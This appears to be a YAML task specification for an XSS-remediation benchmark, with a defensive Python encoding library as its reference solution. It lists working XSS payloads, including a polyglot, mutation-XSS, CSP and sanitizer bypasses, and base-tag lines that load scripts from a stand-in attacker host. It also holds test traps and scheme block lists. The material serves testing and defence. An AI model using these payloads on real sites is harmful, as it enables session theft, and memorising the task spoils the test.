@@ -1,0 +1,1547 @@
+id: "sec-vuln-xss-polyglot-001"
+version: "2.0.0"
+category: "security"
+subcategory: "vulnerabilities"
+
+# === LLM GENERATION FRAMEWORK ===
+generation_framework:
+  multi_conversation_workflow:
+    phase_1_research: "Research advanced XSS bypass techniques, DOM clobbering, and mutation XSS"
+    phase_2_creation: "Create multi-context XSS challenge with browser-specific polyglots"
+    phase_3_amplification: "Add WAF bypass, CSP bypass, and framework-specific exploitation"
+    phase_4_verification:
+      base_validation: "Validate task requires advanced browser security and encoding expertise"
+      enhanced_criteria:
+        - "Has at least 5 interacting vulnerability chains"
+        - "Has cascading exploitation paths that require chained attacks"
+        - "Requires knowledge of compiler/interpreter internals for exploitation"
+        - "Would take experienced security researchers 45+ minutes"
+  
+  complexity_targets:
+    min_steps: 15
+    max_steps: 55
+    required_expertise:
+      - "Browser parsing behavior"
+      - "HTML/JavaScript/CSS context analysis"
+      - "DOM manipulation and clobbering"
+      - "Content Security Policy"
+      - "Encoding and character set manipulation"
+    
+  anti_shortcut_measures:
+    - "Require identification of multiple injection contexts"
+    - "Demand context-aware output encoding"
+    - "Test against browser-specific parsing quirks"
+    - "Verify CSP effectiveness"
+
+# SWE-bench_Pro style fields
+problem_statement: |
+  A web application has XSS vulnerabilities that evade standard sanitization. 
+  The attacks use polyglot payloads that work across multiple contexts:
+  
+  1. JavaScript in unquoted HTML attributes
+  2. Template literal injection in modern JS frameworks
+  3. DOM clobbering to bypass security checks
+  4. mXSS through browser parsing quirks
+  5. SVG/MathML namespace confusion
+  6. Event handler in various HTML contexts
+  7. CSS expression/behavior injection
+  8. URL scheme injection (javascript:, data:)
+  9. Unicode normalization bypass
+  10. Prototype pollution leading to XSS
+
+requirements: |
+  - Identify ALL XSS injection contexts (HTML, attribute, JS, URL, CSS)
+  - Implement context-aware output encoding
+  - Handle DOM-based XSS vectors
+  - Prevent template literal injection
+  - Block DOM clobbering attacks
+  - Implement effective Content Security Policy
+  - Handle SVG and MathML contexts
+  - Prevent mutation XSS
+  - Block dangerous URL schemes
+  - Handle Unicode and encoding edge cases
+
+interface: |
+  Input: Web application code with XSS vulnerabilities
+  Output: XSS-safe code with CSP, comprehensive security audit report
+  Validation: No XSS possible with comprehensive polyglot payloads
+
+# === TOPIC UNIVERSE (100+ topics) ===
+topic_universe:
+  xss_fundamentals:
+    - "Reflected XSS"
+    - "Stored XSS"
+    - "DOM-based XSS"
+    - "Blind XSS"
+    - "Self-XSS"
+    - "Universal XSS (UXSS)"
+    - "XSS via file upload"
+    - "XSS via HTTP headers"
+    - "XSS via WebSockets"
+    - "XSS via postMessage"
+    
+  html_context_attacks:
+    - "Tag injection (<script>)"
+    - "Event handler injection (onerror, onload)"
+    - "Attribute injection"
+    - "Comment breakout"
+    - "CDATA section injection"
+    - "DOCTYPE manipulation"
+    - "Meta refresh injection"
+    - "Base tag injection"
+    - "Form action hijacking"
+    - "Link href injection"
+    
+  attribute_context_attacks:
+    - "Unquoted attribute breakout"
+    - "Single-quoted attribute breakout"
+    - "Double-quoted attribute breakout"
+    - "Event handler in attribute"
+    - "href attribute with javascript:"
+    - "src attribute manipulation"
+    - "style attribute injection"
+    - "data-* attribute exploitation"
+    - "formaction attribute injection"
+    - "srcdoc attribute in iframe"
+    
+  javascript_context_attacks:
+    - "String literal breakout"
+    - "Template literal injection"
+    - "Regular expression injection"
+    - "JSON injection"
+    - "JSONP callback manipulation"
+    - "eval() with user input"
+    - "setTimeout/setInterval injection"
+    - "Function constructor abuse"
+    - "innerHTML assignment"
+    - "document.write exploitation"
+    
+  dom_based_attacks:
+    - "location.hash exploitation"
+    - "location.search injection"
+    - "document.referrer manipulation"
+    - "window.name abuse"
+    - "postMessage origin bypass"
+    - "LocalStorage XSS"
+    - "SessionStorage XSS"
+    - "IndexedDB XSS"
+    - "Service Worker manipulation"
+    - "WebRTC data channel XSS"
+    
+  dom_clobbering:
+    - "Named element access (document.forms)"
+    - "ID-based clobbering"
+    - "Form element clobbering"
+    - "Anchor name clobbering"
+    - "Object/Embed clobbering"
+    - "Image name clobbering"
+    - "HTMLCollection manipulation"
+    - "Clobbering security checks"
+    - "Clobbering sanitizer configurations"
+    - "Clobbering prototype methods"
+    
+  mutation_xss:
+    - "Browser parsing normalization"
+    - "Tag nesting violations"
+    - "Entity decoding mutations"
+    - "Attribute normalization"
+    - "CSS parsing mutations"
+    - "SVG parsing differences"
+    - "MathML parsing quirks"
+    - "Template element mutations"
+    - "Custom element mutations"
+    - "Shadow DOM mutations"
+    
+  encoding_bypass:
+    - "HTML entity encoding bypass"
+    - "URL encoding (percent encoding)"
+    - "Unicode encoding"
+    - "UTF-7 injection"
+    - "Double encoding"
+    - "Mixed encoding"
+    - "Overlong UTF-8"
+    - "Invalid UTF-8 sequences"
+    - "Byte order mark (BOM) manipulation"
+    - "Character set sniffing exploitation"
+    
+  framework_specific:
+    - "React dangerouslySetInnerHTML"
+    - "Angular template injection"
+    - "Vue v-html directive"
+    - "jQuery $.html() sinks"
+    - "Handlebars/Mustache unescaped"
+    - "EJS unescaped output"
+    - "Pug unescaped content"
+    - "Blade raw output"
+    - "Twig raw filter"
+    - "Jinja2 safe filter misuse"
+    
+  csp_bypass:
+    - "script-src 'unsafe-inline'"
+    - "script-src 'unsafe-eval'"
+    - "Whitelisted CDN abuse"
+    - "JSONP endpoint exploitation"
+    - "Base-uri manipulation"
+    - "Object-src bypass"
+    - "angular.js CSP bypass"
+    - "nonce/hash bypass"
+    - "script-src-elem bypass"
+    - "Strict-dynamic bypass"
+    
+  special_contexts:
+    - "SVG context XSS"
+    - "MathML context XSS"
+    - "XML context XSS"
+    - "XHTML context XSS"
+    - "Markdown XSS"
+    - "PDF XSS (JavaScript in PDF)"
+    - "Flash XSS (legacy)"
+    - "Email HTML XSS"
+    - "Rich text editor XSS"
+    - "WYSIWYG XSS"
+
+# === ATTACK CHAINS (50+ chains) ===
+attack_chains:
+  basic_xss_chains:
+    - name: "Reflected XSS via Search Parameter"
+      steps:
+        - "Identify reflection point in search results"
+        - "Test for HTML context injection"
+        - "Craft payload: <script>alert(document.domain)</script>"
+        - "URL encode if necessary"
+        - "Deliver malicious link to victim"
+        - "Payload executes in victim's browser"
+      difficulty: "easy"
+      payload: "<script>alert(1)</script>"
+      
+    - name: "Stored XSS via Comment Field"
+      steps:
+        - "Identify stored content (comments, profiles)"
+        - "Test input sanitization"
+        - "Inject persistent payload"
+        - "Wait for other users to view content"
+        - "Payload executes for all viewers"
+      difficulty: "easy"
+      
+    - name: "DOM XSS via Fragment Identifier"
+      steps:
+        - "Identify JavaScript using location.hash"
+        - "Analyze how hash is processed"
+        - "Craft payload in fragment identifier"
+        - "No server interaction needed"
+        - "Payload executes on page load"
+      difficulty: "medium"
+      payload: "#<img src=x onerror=alert(1)>"
+      
+  advanced_bypass_chains:
+    - name: "Polyglot XSS Bypass"
+      steps:
+        - "Identify multiple injection contexts"
+        - "Craft payload valid in all contexts"
+        - "Bypass context-specific filters"
+        - "Execute in whichever context renders"
+      difficulty: "hard"
+      payload: |
+        jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+        
+    - name: "Mutation XSS via Nested Tags"
+      steps:
+        - "Identify innerHTML or DOMParser usage"
+        - "Craft payload that mutates during parsing"
+        - "Use nested invalid HTML structures"
+        - "Browser normalizes to valid XSS"
+      difficulty: "hard"
+      payload: "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id='x'><img src=1 onerror=alert(1)></path>"
+      cve_references: ["CVE-2019-8658"]
+      
+    - name: "DOM Clobbering for Security Bypass"
+      steps:
+        - "Identify security check using DOM property"
+        - "Create HTML element with conflicting name/id"
+        - "Element shadows JavaScript variable"
+        - "Security check returns unexpected value"
+        - "Inject XSS payload"
+      difficulty: "hard"
+      payload: '<form id="config"><input name="sanitize" value="false">'
+      
+    - name: "SVG XSS with onload"
+      steps:
+        - "Identify SVG upload or inclusion"
+        - "Craft SVG with embedded JavaScript"
+        - "Use event handlers (onload, onclick)"
+        - "SVG renders with script execution"
+      difficulty: "medium"
+      payload: '<svg onload="alert(1)">'
+      
+  csp_bypass_chains:
+    - name: "CSP Bypass via JSONP"
+      steps:
+        - "Identify CSP allowing trusted domain"
+        - "Find JSONP endpoint on trusted domain"
+        - "Craft callback with XSS payload"
+        - "Include JSONP in script tag"
+        - "CSP allows, payload executes"
+      difficulty: "medium"
+      payload: '<script src="//trusted.com/jsonp?callback=alert"></script>'
+      
+    - name: "CSP Bypass via AngularJS"
+      steps:
+        - "Identify CSP allowing AngularJS CDN"
+        - "Load AngularJS on page"
+        - "Use Angular expression sandbox bypass"
+        - "Execute arbitrary JavaScript"
+      difficulty: "hard"
+      payload: |
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js"></script>
+        <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+        
+    - name: "CSP Bypass via Base Tag"
+      steps:
+        - "Identify relative script inclusions"
+        - "Inject base tag pointing to attacker server"
+        - "Relative scripts load from attacker"
+        - "Malicious scripts execute"
+      difficulty: "medium"
+      payload: '<base href="https://attacker.com/">'
+      
+  framework_specific_chains:
+    - name: "React dangerouslySetInnerHTML"
+      steps:
+        - "Identify React component with dangerouslySetInnerHTML"
+        - "Find user input flowing to this prop"
+        - "Craft HTML payload"
+        - "React renders without escaping"
+        - "XSS executes"
+      difficulty: "medium"
+      
+    - name: "Angular Template Injection"
+      steps:
+        - "Identify user input in Angular template"
+        - "Craft Angular expression: {{constructor.constructor('alert(1)')()}}"
+        - "Template renders and evaluates expression"
+        - "Sandbox escape achieved (older versions)"
+      difficulty: "hard"
+      cve_references: ["CVE-2019-14863"]
+      
+    - name: "Vue v-html Directive"
+      steps:
+        - "Identify v-html with user input"
+        - "Inject HTML payload"
+        - "Vue renders raw HTML"
+        - "XSS executes"
+      difficulty: "medium"
+      
+  encoding_bypass_chains:
+    - name: "Unicode Normalization Bypass"
+      steps:
+        - "Identify Unicode normalization"
+        - "Find characters that normalize to dangerous chars"
+        - "Craft payload with Unicode equivalents"
+        - "Normalization converts to XSS"
+      difficulty: "hard"
+      example: "U+FE64 (﹤) normalizes to <"
+      
+    - name: "Double Encoding Bypass"
+      steps:
+        - "Identify URL decoding"
+        - "Double encode payload"
+        - "First decode passes filter"
+        - "Second decode creates XSS"
+      difficulty: "medium"
+      payload: "%253Cscript%253Ealert(1)%253C%252Fscript%253E"
+      
+    - name: "UTF-7 Content Type Sniffing"
+      steps:
+        - "Identify page without charset declaration"
+        - "Inject UTF-7 encoded payload"
+        - "Browser sniffs UTF-7 charset"
+        - "UTF-7 decodes to XSS"
+      difficulty: "medium"
+      payload: "+ADw-script+AD4-alert(1)+ADw-/script+AD4-"
+
+# === DEFENSE BYPASS TECHNIQUES (100+) ===
+defense_bypass_techniques:
+  sanitizer_bypass:
+    - "Case variation: <ScRiPt>"
+    - "Tag name obfuscation: <scr<script>ipt>"
+    - "Null byte injection: <scr%00ipt>"
+    - "New line injection: <scr\nipt>"
+    - "Tab injection: <scr\tipt>"
+    - "Comment bypass: <!--><script>-->"
+    - "CDATA bypass: <![CDATA[<script>]]>"
+    - "Invalid attribute bypass: <img src=x onerror=alert(1)>"
+    - "Protocol-relative URL: //attacker.com/xss.js"
+    - "Data URL: data:text/html,<script>alert(1)</script>"
+    
+  encoding_bypass:
+    - "HTML entities: &#60;script&#62;"
+    - "Hex entities: &#x3C;script&#x3E;"
+    - "URL encoding: %3Cscript%3E"
+    - "Double encoding: %253Cscript%253E"
+    - "Unicode: \u003Cscript\u003E"
+    - "Mixed encoding: %3C\u0073cript>"
+    - "Overlong UTF-8: %C0%BC"
+    - "Half-width katakana"
+    - "Full-width characters"
+    - "Combining characters"
+    
+  event_handler_bypass:
+    - "Common: onerror, onload, onclick"
+    - "Less common: onfocus, onblur, onmouseover"
+    - "Exotic: onanimationend, ontransitionend"
+    - "Mobile: ontouchstart, ontouchmove"
+    - "Media: onplay, onpause, onended"
+    - "Form: oninput, onchange, oninvalid"
+    - "Drag/drop: ondrag, ondrop"
+    - "Clipboard: oncopy, onpaste, oncut"
+    - "Print: onbeforeprint, onafterprint"
+    - "Error: onerror with various elements"
+    
+  javascript_bypass:
+    - "eval alternatives: Function(), setTimeout"
+    - "Constructor: ''.constructor.constructor('code')()"
+    - "Array: [].constructor.constructor('code')()"
+    - "Object: {}.constructor.constructor('code')()"
+    - "Template literals: `${alert(1)}`"
+    - "Tagged templates: tag`${alert(1)}`"
+    - "With statement: with(document)alert(1)"
+    - "Arrow functions: (()=>alert(1))()"
+    - "Async functions: (async()=>alert(1))()"
+    - "Generator functions"
+    
+  html_bypass:
+    - "Different tags: <img>, <svg>, <body>, <marquee>"
+    - "Custom elements: <custom-element>"
+    - "Unknown elements: <foo onclick=alert(1)>"
+    - "Namespace confusion: <svg><a xmlns:xlink='...'>"
+    - "Entity references: &lt;script&gt;"
+    - "Character references: &#60;script&#62;"
+    - "CDATA sections in XML"
+    - "Processing instructions"
+    - "DOCTYPE manipulation"
+    - "Comment injection"
+    
+  waf_bypass:
+    - "Chunked encoding"
+    - "HTTP parameter pollution"
+    - "Content-Type manipulation"
+    - "Unicode normalization"
+    - "Case variation"
+    - "Comment injection"
+    - "Whitespace manipulation"
+    - "Null byte injection"
+    - "Path traversal in payload"
+    - "Time-based payload execution"
+
+# === REAL-WORLD SCENARIOS ===
+real_world_scenarios:
+  content_platforms:
+    - scenario: "Social Media Comment Section"
+      description: "User-generated content with HTML formatting"
+      complexity: "high"
+      attack_vector: "Stored XSS via formatted posts"
+      
+    - scenario: "Blog/CMS Rich Text Editor"
+      description: "WYSIWYG editor allowing HTML input"
+      complexity: "high"
+      attack_vector: "XSS via embedded media or formatting"
+      
+    - scenario: "Forum/Discussion Board"
+      description: "BBCode or Markdown with preview"
+      complexity: "medium"
+      attack_vector: "XSS via malformed markup"
+      
+  e-commerce:
+    - scenario: "Product Search"
+      description: "Search results with highlighted terms"
+      complexity: "medium"
+      attack_vector: "Reflected XSS in search parameter"
+      
+    - scenario: "User Reviews"
+      description: "Product reviews with ratings"
+      complexity: "medium"
+      attack_vector: "Stored XSS in review content"
+      
+    - scenario: "Wishlist Sharing"
+      description: "Shared wishlists with custom names"
+      complexity: "medium"
+      attack_vector: "XSS via wishlist name"
+      
+  enterprise_applications:
+    - scenario: "Admin Dashboard"
+      description: "Administrative interface with user data display"
+      complexity: "high"
+      attack_vector: "XSS via displayed user data"
+      
+    - scenario: "Report Generator"
+      description: "Custom reports with user-defined parameters"
+      complexity: "medium"
+      attack_vector: "XSS in report parameters"
+      
+    - scenario: "Email Template Editor"
+      description: "HTML email template creation"
+      complexity: "high"
+      attack_vector: "XSS in email preview"
+      
+  developer_tools:
+    - scenario: "Issue Tracker"
+      description: "Bug reports with Markdown"
+      complexity: "medium"
+      attack_vector: "XSS via issue description"
+      cve_examples: ["GitHub CVEs", "GitLab CVEs"]
+      
+    - scenario: "API Documentation"
+      description: "Auto-generated API docs"
+      complexity: "medium"
+      attack_vector: "XSS via API parameter names"
+      
+    - scenario: "Log Viewer"
+      description: "Application log display"
+      complexity: "medium"
+      attack_vector: "XSS via logged user input"
+
+# === DIFFICULTY CONFIGURATION ===
+difficulty:
+  estimated: "extreme"
+  time_range: [7200, 28800]
+  command_steps: [150, 600]
+  
+  difficulty_amplifiers:
+    nightmare:
+      multiplier: 4.0
+      description: "CTF-final level difficulty requiring expert exploitation skills"
+      requirements:
+        - "7+ interacting vulnerabilities requiring chained exploitation"
+        - "Requires understanding of target runtime/compiler internals"
+        - "Time estimate: 180+ minutes for senior security researchers"
+        - "Multiple protection bypass techniques required"
+        - "Requires synthesizing reverse engineering, exploitation, and cryptography"
+    
+    nightmare_plus:
+      multiplier: 8.0
+      estimated_time: [43200, 172800]
+      command_steps: [500, 2000]
+      techniques_required: 18
+      description: "Real-world 0-day exploitation requiring novel XSS discovery and CSP bypass techniques"
+      requirements:
+        - "15+ deeply interacting vulnerabilities across HTML, JavaScript, and CSS contexts"
+        - "Requires browser-specific parsing quirk exploitation"
+        - "Time estimate: 12-48 hours for senior security researchers with OSCP/OSWE/OSCE certifications"
+        - "Custom polyglot payload development for multi-context bypass"
+        - "Must bypass strict CSP, DOMPurify, and framework sanitizers"
+        - "Requires understanding of browser parsing internals and DOM clobbering"
+        - "Must achieve full session hijacking or account takeover through XSS chain"
+        - "Mutation XSS and prototype pollution chain exploitation required"
+  
+  generation_targets:
+    minimum_difficulty: "120-360 minutes for senior security researchers with offensive security certifications (OSCP/OSWE/OSCE)"
+    quality_requirements: "Must require deep understanding of browser security, context-aware encoding, and modern CSP bypass"
+  
+  difficulty_levels:
+    beginner:
+      description: "Basic <script> tag injection"
+      time_estimate: 900
+      prerequisites: ["HTML basics"]
+      
+    intermediate:
+      description: "Event handler and encoding bypass"
+      time_estimate: 1500
+      prerequisites: ["JavaScript basics", "URL encoding"]
+      
+    advanced:
+      description: "DOM clobbering and mutation XSS"
+      time_estimate: 2400
+      prerequisites: ["DOM manipulation", "Browser parsing"]
+      
+    expert:
+      description: "CSP bypass and polyglot creation"
+      time_estimate: 3600
+      prerequisites: ["CSP", "Advanced JavaScript", "Browser internals"]
+
+# === MULTI-AGENT ORCHESTRATION ===
+multi_agent_orchestration:
+  required_agents: 8
+  coordination_complexity: "extreme"
+  
+  specialized_agents:
+    - name: "context_analyst"
+      role: "Identify injection contexts and encoding requirements"
+      expertise: ["HTML context", "attribute context", "JavaScript context", "URL context", "CSS context"]
+      
+    - name: "polyglot_developer"
+      role: "Craft multi-context XSS payloads"
+      expertise: ["polyglot construction", "encoding bypass", "browser-specific payloads"]
+      
+    - name: "csp_bypass_specialist"
+      role: "Bypass Content Security Policy"
+      expertise: ["JSONP abuse", "Angular CSP bypass", "nonce/hash bypass", "strict-dynamic exploitation"]
+      
+    - name: "dom_specialist"
+      role: "Exploit DOM-based XSS vectors"
+      expertise: ["DOM clobbering", "prototype pollution", "innerHTML sinks", "eval sinks"]
+      
+    - name: "mxss_specialist"
+      role: "Exploit mutation XSS vulnerabilities"
+      expertise: ["browser parsing quirks", "sanitizer bypass", "DOM mutation"]
+      
+    - name: "framework_specialist"
+      role: "Exploit framework-specific XSS"
+      expertise: ["React", "Angular", "Vue", "template injection"]
+      
+    - name: "encoding_specialist"
+      role: "Bypass encoding and sanitization"
+      expertise: ["HTML entities", "Unicode normalization", "double encoding"]
+      
+    - name: "waf_bypass_specialist"
+      role: "Bypass web application firewall XSS detection"
+      expertise: ["case manipulation", "encoding tricks", "payload fragmentation"]
+  
+  cross_vulnerability_chains:
+    - chain: "Stored XSS -> Session hijacking -> Account takeover -> Privilege escalation"
+      complexity: "high"
+      
+    - chain: "DOM clobbering -> Sanitizer bypass -> XSS -> CSRF -> Full compromise"
+      complexity: "extreme"
+      
+    - chain: "Prototype pollution -> XSS sink pollution -> Stored XSS"
+      complexity: "extreme"
+      
+    - chain: "mXSS via sanitizer -> Session token theft -> API abuse"
+      complexity: "extreme"
+      
+    - chain: "CSP bypass via JSONP -> XSS execution -> Cookie exfiltration"
+      complexity: "high"
+
+# === EXPLOIT CHAIN REQUIREMENTS ===
+exploit_chain_requirements:
+  minimum_chain_length: 4
+  required_stages:
+    - stage: "injection_discovery"
+      description: "Identify all XSS injection points"
+      techniques:
+        - "Input/output mapping"
+        - "Context identification"
+        - "Sanitizer analysis"
+        - "CSP enumeration"
+    
+    - stage: "context_analysis"
+      description: "Determine encoding and escaping requirements"
+      techniques:
+        - "Context breakout analysis"
+        - "Encoding behavior testing"
+        - "Filter bypass enumeration"
+        - "Browser-specific testing"
+    
+    - stage: "payload_development"
+      description: "Craft working XSS payload"
+      techniques:
+        - "Polyglot construction"
+        - "Encoding bypass"
+        - "CSP bypass"
+        - "Sanitizer evasion"
+    
+    - stage: "exploitation"
+      description: "Achieve meaningful impact"
+      techniques:
+        - "Session hijacking"
+        - "Credential theft"
+        - "Keylogging"
+        - "Account takeover"
+
+# === DEFENSIVE EVASION ===
+defensive_evasion:
+  security_controls_to_bypass:
+    - control: "Content Security Policy (CSP)"
+      bypass_techniques:
+        - "JSONP endpoint on whitelisted domain"
+        - "Angular expression sandbox bypass"
+        - "base-uri manipulation"
+        - "script-src-elem bypass"
+        - "nonce reuse exploitation"
+      
+    - control: "DOMPurify/Sanitizer"
+      bypass_techniques:
+        - "Mutation XSS through parser normalization"
+        - "Namespace confusion (SVG/MathML)"
+        - "Prototype pollution to configure sanitizer"
+        - "Custom element exploitation"
+      
+    - control: "Framework Auto-Escaping"
+      bypass_techniques:
+        - "dangerouslySetInnerHTML in React"
+        - "v-html in Vue"
+        - "bypassSecurityTrust in Angular"
+        - "Template injection"
+      
+    - control: "WAF XSS Rules"
+      bypass_techniques:
+        - "Case manipulation"
+        - "Comment injection"
+        - "Unicode normalization"
+        - "HTTP parameter pollution"
+        - "Chunked encoding"
+
+# === REAL-WORLD CORRELATION ===
+real_world_correlation:
+  cve_attack_patterns:
+    - cve: "CVE-2019-8658"
+      technique: "Safari mutation XSS"
+      real_world_impact: "Browser-specific XSS bypass"
+      
+    - cve: "CVE-2019-14863"
+      technique: "Angular expression injection"
+      real_world_impact: "Framework-specific XSS"
+      
+    - cve: "CVE-2020-11022"
+      technique: "jQuery DOM manipulation XSS"
+      real_world_impact: "Widespread library vulnerability"
+
+# === TRAP DENSITY ===
+trap_configuration:
+  total_traps: 15
+  trap_interaction_depth: 5
+  cross_domain_traps: true
+  
+  trap_categories:
+    context_traps: 4
+    dom_traps: 4
+    encoding_traps: 4
+    csp_traps: 3
+
+# === LLM TRAP CONFIGURATIONS (50+) ===
+traps:
+  context_traps:
+    - type: "attribute_context"
+      description: "XSS in unquoted HTML attribute"
+      trigger: "Using HTML encoding for attribute without quotes"
+      payload: '<input value=x onfocus=alert(1) autofocus>'
+      
+    - type: "template_literal"
+      description: "JavaScript template literal allows ${} execution"
+      trigger: "Not escaping backticks and ${} in JS strings"
+      payload: '`${alert(1)}`'
+      
+    - type: "javascript_string"
+      description: "Breaking out of JS string context"
+      trigger: "Only HTML encoding in JS string"
+      payload: "'; alert(1); '"
+      
+    - type: "url_context"
+      description: "javascript: URL scheme execution"
+      trigger: "Not blocking javascript: in href"
+      payload: 'javascript:alert(1)'
+      
+  dom_traps:
+    - type: "dom_clobbering"
+      description: "HTML elements override JS globals"
+      trigger: "Trusting DOM APIs without checking type"
+      payload: '<img id="x" name="alert"><a id="x" name="alert">'
+      
+    - type: "mxss"
+      description: "Mutation XSS from parser normalization"
+      trigger: "Sanitizing then inserting via innerHTML"
+      payload: '<math><mi//xlink:href="data:x,<script>alert(1)</script>">'
+      
+    - type: "prototype_pollution"
+      description: "Prototype pollution leads to XSS"
+      trigger: "Object.assign with user input"
+      payload: '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}'
+      
+  encoding_traps:
+    - type: "unicode_normalization"
+      description: "Unicode characters normalize to dangerous chars"
+      trigger: "Not handling Unicode before comparison"
+      payload: "＜script＞alert(1)＜/script＞"
+      
+    - type: "double_encoding"
+      description: "Double encoded payload bypasses filter"
+      trigger: "Checking before all decoding steps"
+      payload: "%253Cscript%253Ealert(1)"
+      
+    - type: "charset_mismatch"
+      description: "Character set confusion"
+      trigger: "No explicit charset declaration"
+      payload: "+ADw-script+AD4-alert(1)+ADw-/script+AD4-"
+
+# === COMPREHENSIVE TASK GENERATION TEMPLATE ===
+instruction_template: |
+  You are fixing a {{ scenario_type }} with complex XSS vulnerabilities.
+  The code is at {{ path }}.
+  
+  System details:
+  - Platform: {{ platform }}
+  - Language: {{ language }}
+  - Framework: {{ framework }}
+  
+  XSS contexts found: {{ xss_contexts }}
+  Polyglot bypasses possible: {{ bypass_count }} unique vectors
+  Current CSP: {{ csp_policy }}
+  
+  Attack model:
+  - Attacker controls: {{ attacker_control }}
+  - Victim interaction: {{ victim_interaction }}
+  - Data persistence: {{ data_persistence }}
+  
+  Your task:
+  {{ task_steps }}
+  
+  Additional requirements:
+  - Implement context-aware encoding for all outputs
+  - Deploy effective Content Security Policy
+  - Handle DOM-based XSS vectors
+  - Prevent DOM clobbering
+  - Block dangerous URL schemes
+  - Handle Unicode normalization
+
+# === REFERENCE SOLUTION (COMPREHENSIVE) ===
+reference_solution: |
+  #!/usr/bin/env python3
+  """
+  XSS Prevention Library
+  
+  Comprehensive protection against Cross-Site Scripting:
+  1. Context-aware output encoding
+  2. DOM clobbering prevention
+  3. Content Security Policy
+  4. URL scheme validation
+  5. Unicode normalization handling
+  """
+  
+  import html
+  import re
+  import json
+  import urllib.parse
+  from typing import Optional, Dict, List, Any, Set
+  from enum import Enum
+  from dataclasses import dataclass
+  import unicodedata
+  
+  
+  class OutputContext(Enum):
+      """Output contexts requiring different encoding strategies."""
+      HTML_CONTENT = "html_content"
+      HTML_ATTRIBUTE_QUOTED = "html_attr_quoted"
+      HTML_ATTRIBUTE_UNQUOTED = "html_attr_unquoted"
+      JAVASCRIPT_STRING = "js_string"
+      JAVASCRIPT_TEMPLATE = "js_template"
+      JAVASCRIPT_BLOCK = "js_block"
+      URL = "url"
+      URL_PARAMETER = "url_param"
+      CSS_STRING = "css_string"
+      CSS_PROPERTY = "css_property"
+      JSON = "json"
+      
+      
+  @dataclass
+  class XSSFinding:
+      """Record of XSS vulnerability finding."""
+      context: OutputContext
+      location: str
+      payload: str
+      description: str
+      severity: str
+      
+      
+  # ============================================================
+  # CONTEXT-AWARE ENCODING
+  # ============================================================
+  
+  def encode_html_content(value: str) -> str:
+      """
+      Encode for HTML content context.
+      
+      Safe for: <div>{{ value }}</div>
+      Encodes: < > & " '
+      """
+      return html.escape(value, quote=True)
+  
+  
+  def encode_html_attribute_quoted(value: str) -> str:
+      """
+      Encode for quoted HTML attribute.
+      
+      Safe for: <div class="{{ value }}">
+      Encodes: " & < >
+      """
+      return html.escape(value, quote=True)
+  
+  
+  def encode_html_attribute_unquoted(value: str) -> str:
+      """
+      Encode for unquoted HTML attribute.
+      
+      Safe for: <div class={{ value }}>
+      Much more aggressive encoding needed!
+      """
+      result = []
+      for char in value:
+          if char.isalnum():
+              result.append(char)
+          else:
+              # Hex encode everything else
+              result.append(f'&#x{ord(char):02x};')
+      return ''.join(result)
+  
+  
+  def encode_javascript_string(value: str, quote_char: str = '"') -> str:
+      """
+      Encode for JavaScript string context.
+      
+      Safe for: var x = "{{ value }}";
+      Handles: quotes, newlines, and HTML-breaking chars
+      """
+      # Mapping of dangerous characters
+      escapes = {
+          '\\': '\\\\',
+          '\n': '\\n',
+          '\r': '\\r',
+          '\t': '\\t',
+          '\f': '\\f',
+          '\b': '\\b',
+          '"': '\\"' if quote_char == '"' else '"',
+          "'": "\\'" if quote_char == "'" else "'",
+          '<': '\\x3c',  # Prevent </script> breakout
+          '>': '\\x3e',
+          '/': '\\/',    # Prevent </script>
+          '\u2028': '\\u2028',  # Line separator
+          '\u2029': '\\u2029',  # Paragraph separator
+      }
+      
+      result = []
+      for char in value:
+          if char in escapes:
+              result.append(escapes[char])
+          elif ord(char) < 32:
+              result.append(f'\\x{ord(char):02x}')
+          else:
+              result.append(char)
+      
+      return ''.join(result)
+  
+  
+  def encode_javascript_template(value: str) -> str:
+      """
+      Encode for JavaScript template literal.
+      
+      Safe for: var x = `{{ value }}`;
+      Additional escapes for ${} and backticks
+      """
+      escapes = {
+          '\\': '\\\\',
+          '`': '\\`',
+          '$': '\\$',  # Prevents ${} execution
+          '\n': '\\n',
+          '\r': '\\r',
+          '<': '\\x3c',
+          '>': '\\x3e',
+          '/': '\\/',
+      }
+      
+      result = []
+      for char in value:
+          if char in escapes:
+              result.append(escapes[char])
+          elif ord(char) < 32:
+              result.append(f'\\x{ord(char):02x}')
+          else:
+              result.append(char)
+      
+      return ''.join(result)
+  
+  
+  def encode_url(value: str) -> str:
+      """
+      Encode and validate for URL context.
+      
+      Blocks dangerous URL schemes like javascript: and data:
+      """
+      # Normalize and strip whitespace
+      value = value.strip()
+      
+      # Normalize Unicode to prevent bypass via confusables
+      value = unicodedata.normalize('NFKC', value)
+      
+      # Check for dangerous URL schemes (case-insensitive)
+      value_lower = value.lower()
+      
+      dangerous_schemes = [
+          'javascript:',
+          'data:',
+          'vbscript:',
+          'file:',
+          'about:',
+          'blob:',
+      ]
+      
+      # Also check with various obfuscations
+      # Remove control characters and whitespace within scheme
+      cleaned = re.sub(r'[\x00-\x20]', '', value_lower)
+      
+      for scheme in dangerous_schemes:
+          if cleaned.startswith(scheme):
+              return '#blocked'
+          # Check with entity decoding
+          if scheme in cleaned.replace('&#', '').replace(';', ''):
+              return '#blocked'
+      
+      # Encode for URL
+      return urllib.parse.quote(value, safe='/:?=&#')
+  
+  
+  def encode_css_string(value: str) -> str:
+      """
+      Encode for CSS string context.
+      
+      Safe for: content: "{{ value }}";
+      """
+      result = []
+      for char in value:
+          if char.isalnum():
+              result.append(char)
+          elif char == ' ':
+              result.append(' ')
+          else:
+              # CSS hex escape
+              result.append(f'\\{ord(char):06x}')
+      return ''.join(result)
+  
+  
+  def encode_css_property(value: str) -> str:
+      """
+      Encode for CSS property value.
+      
+      Removes dangerous CSS constructs.
+      """
+      # Block dangerous CSS patterns
+      dangerous_patterns = [
+          r'expression\s*\(',
+          r'url\s*\(',
+          r'@import',
+          r'behavior\s*:',
+          r'-moz-binding',
+          r'javascript:',
+      ]
+      
+      result = value
+      for pattern in dangerous_patterns:
+          result = re.sub(pattern, '', result, flags=re.IGNORECASE)
+      
+      return result
+  
+  
+  def safe_json(value: Any) -> str:
+      """
